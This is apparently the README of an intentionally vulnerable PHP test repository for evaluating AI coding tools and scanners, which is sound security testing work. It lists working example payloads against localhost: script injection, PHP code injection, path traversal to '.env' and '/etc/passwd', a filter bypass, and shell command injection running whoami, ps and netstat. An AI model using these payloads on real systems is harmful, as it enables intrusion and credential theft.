# Security Testing PHP Codebase

## Overview
This repository contains intentionally vulnerable code designed to test AI-powered IDE tools and security scanners. The codebase serves as a testing ground to evaluate the effectiveness of various security analysis tools in detecting vulnerabilities.

## Purpose
- Test AI-powered IDE tools' ability to detect security vulnerabilities against PHP codebase. You can prompt the Agent to `What are the vulnerabilities in my code`.
- Evaluate security scanners' effectiveness in identifying common security issues
- Provide a controlled environment for security testing
- Serve as a reference for understanding common security vulnerabilities
- Continuously expand with new vulnerabilities and security test cases over time
- Demonstrate how sensitive environment variables can be exposed through `.env` files in version control (intentionally included to test security scanners)

## Author
Created by Weng Fei Fung

## Usage
This repository is intended for:
- Security researchers
- AI tool developers
- Security testing professionals
- Educational purposes


## Setup

Run on a php server locally. This has been tested on PHP version 8.3.12. You can find your PHP version by running `php --version`. For the example vulnerabilities, you can setup Mamp and have this app folder as `hacks` at the root htdocs and set port to 8888, otherwise adjust the example vulnerability url's as appropriately.

## Example vulnerabilities
- http://localhost:8888/hacks/echo/?name=%3Cscript%3Ealert(%22You%27re%20hacked!%22);%3C/script%3E
    - Cross-site scripting (XSS)
    - Here exploited to inject into URL's that users share with others
    - Classification: 
        - CAPEC	19
        - CWE	79
        - WASC  8
        - OWASP 2021 A3
- http://localhost:8888/hacks/commands-php/?user-role=admin;phpinfo();
    - Remote Code Execution (RCE)
    - Here exploited to reveal PHP information that can be used for further attacks.
    - CAPEC	23
    - CWE	95
    - OWASP 2021	A3
- http://localhost:8888/hacks/open-file/?filepath=../.env
    - Local file inclusion (LFI)
    - Here gained access to .env file for API keys
    - CAPEC	252
    - CWE	98
    - WASC	33
    - OWASP 2021	A1
- http://localhost:8888/hacks/open-file/?filepath=%2e.%2f.env
    - Local file inclusion (LFI)
    - Here worked around naive regex security against LFI's `../`
- http://localhost:8888/hacks/open-file/?filepath=../etc/passwd
    - Directory traversal attack (DTA)
    - Here hacker would've broke out of the web document root folder with more `../`'s and accessed the credentials
    - CAPEC	126
    - CWE	23
    - WASC	33
    - OWASP 2021	A1
- http://localhost:8888/hacks/commands-shell/grep.php?search=at
    - Baseline use (Not hacked). But will be used to OS command injection
- http://localhost:8888/hacks/commands-shell/grep.php?search=at%20;ls%20.;
    - OS command injection
    - Here gained access to directory still within the web document root folder
    - Injected between grep command and a grep option.
    - CAPEC	88
    - CWE	78
    - WASC	31
    - OWASP 2021	A3
- http://localhost:8888/hacks/commands-shell/find.php?search=at;ls%20.;
    - OS command injection
    - Here gained access to directory still within the web document root folder
    - Injected at the end of the find command.
- http://localhost:8888/hacks/commands-shell/find.php?search=at;%20whoami
    - ... Here gained access to username of the PHP server
- http://localhost:8888/hacks/commands-shell/find.php?search=at;%20ps%20aux
    - ... Here gained access to a list of processes running at the server
- http://localhost:8888/hacks/commands-shell/find.php?search=at;%20netstat%20-tuln
    - ... Here gained access to network information
    - `lsof -P` is another way for more network information (Eg. `TCP localhost:5001 (LISTEN)` output telling you a port is listening at the server)
    - `iptables`, `firewalld`, etc to inspect allowed ports.

## Warning
⚠️ **IMPORTANT**: This repository contains intentionally vulnerable code. Do not deploy this code in production environments or expose it to untrusted networks. Use only in controlled testing environments.

## Disclaimer
This code is provided for educational and testing purposes only. The author is not responsible for any misuse or damage caused by the code in this repository.
